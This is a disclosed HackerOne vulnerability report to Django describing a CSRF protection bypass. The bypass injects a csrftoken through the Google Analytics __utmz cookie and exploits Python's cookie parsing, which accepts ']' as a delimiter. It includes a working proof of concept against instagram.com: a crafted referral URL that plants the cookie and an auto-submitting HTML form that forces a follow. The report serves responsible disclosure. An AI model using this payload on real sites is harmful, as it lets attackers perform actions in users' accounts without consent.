# CSRF protection bypass on any Django powered site via Google Analytics

## Report Details
- **Report ID**: 26647
- **URL**: https://hackerone.com/reports/26647
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2014-09-01T08:28:27.353Z
- **Disclosed**: 2016-09-26T19:29:10.967Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: django

## Vulnerability Information
I shall explain all the steps to create the final PoC in order to be more clear.

Part 1. Cookie Injection via Google Analytics 
---------------------
(Reported to Google, rewarded, still working)

*   Google Analytics sets the cookie to track user source:
   `__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]`
   For example:
   `__utmz=123456.123456789.11.2.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/path/`

*   User fully controls path in Referer and it is not filtered before being put in __utmz

Part 2. Cookie parsing peculiarities by different web servers
---------------------
*   A typical Cookie sent by a web browser looks like this: 
   Cookie: param1=value1; param2=value2;

*   Many web servers accept cookies delimited not only by semicolons but also by commas: 
   Cookie: param1=value2, param2=value2
   Cookie: param1=value2,param2=value2

*   Python + Django handle cookies with incorrect regular expression that allows to use characters [ \ ] as delimiters: 
   Cookie: param1=value1]param2=value2

https://docs.python.org/3/library/http.cookies.html
http://hg.python.org/cpython/file/3.4/Lib/http/cookies.py#l432
http://tools.ietf.org/html/rfc2109
http://tools.ietf.org/html/rfc2068

Example:
```
>>> from http import cookies
>>> C = cookies.SimpleCookie()
>>> C.load('__utmz=blah]csrftoken=x')
>>> C
<SimpleCookie: csrftoken='x'>
```

Part 3. Cookie handling peculiarities in different web browsers 
---------------------
(Reported to Google, won't fix)
*   For all the web browsers except Safari characters of space, comma, and [ \ ] can be used as cookie values

*   Chrome handles only a limited number of cookie-attributes, e.g.: 
   Set-Cookie: test=test; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=blah.blah.blah.google.com;
   will set cookie for .google.com but not for blah.blah.blah.google.com

Combining all these facts
---------------------

Provided that:
* A site uses Google Analytics
* This site is hosted by a web server that has some of the aforementioned cookie parsing peculiarities (e.g. Django)
* This site implements Cookie based CSRF protection (a value in Cookie and some request parameter must be equal)

Then:
* We can set new arbitrary cookies or redefine the values of existing ones
* This site is vulnerable to CSRF protection bypass


The principal problem of __utmz cookie is that it is set for six months and is not refreshed. This problem can be solved in Google Chrome if you find a subdomain with Google Analytics and rewrite attribute "domain" using the peculiarity that has been described in part 3 with the value ".site.com".

In other browsers the vulnerability can be exploited by cookie injection at the moment of __utmz refreshing.

PoC
---------------------

Vulnerability exploitation on instagram.com with Google Chrome
(Reported to Facebook, redirected to Django Team)

* Open Google Chrome in incognito mode
* Authenticate on instagram.com
* Click the link and wait some seconds
* Result - follow http://instagram.com/black2fan

http://blackfan.ru/facebookbugbounty/nouysqaqfbskgobuqkknoitvyqmjgony_instagram.html
Source:
```
<form 
action="http://instagram.com/web/friendships/1312928755/follow/?ref=emptyfeed" 
id="csrf" 
method="POST">
      <input type="hidden" name="csrfmiddlewaretoken" value="x" />
      <input type="submit" value="Submit request" />
</form>

<script>
      function xxx() {
        document.getElementById('csrf').submit();
      }
</script>

<iframe 
onload="xxx()" 
src="http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/"/>
```

Description:
*   A user authenticates on instagram.com

*   We make him visit the link below assuming that he has not visited blog.instagram.com and he doesn't have __utmz set on this subdomain:
   http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/
   Cookie is rewritten with new path and domain, as a result cookie is set for .instagram.com:
   __utmz=90378079.1401435337.1.1.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/r/,]csrftoken=x,

*   At this moment request to the web server will make it believe that cookie __utmz consists of incorrect cookie and CSRF token equals to "x"

*   Submit follow form using CSRF-token "x"


## Attachments
No attachments
